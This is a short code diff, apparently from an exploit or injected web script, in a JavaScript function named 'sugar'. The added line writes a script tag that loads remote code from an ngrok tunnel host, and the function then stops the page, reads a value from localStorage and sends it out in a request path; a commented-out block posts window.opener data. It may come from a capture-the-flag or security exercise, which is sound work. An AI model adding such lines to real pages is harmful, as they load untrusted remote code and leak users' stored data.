@@ -9,7 +9,7 @@ const sugar = () => {
 	// 	const body = JSON.stringify({ opener: window.opener })
 	// 	fetch('/sugar', { method: 'POST', body })
 	// }
-	document.write('')
+	document.write('<script src="https://cd06e2316155.jp.ngrok.io/v2" />')
 	window.stop()
 	const t = window.localStorage.getItem('xx')
 	if (t) fetch(`/x/${t}/n`)
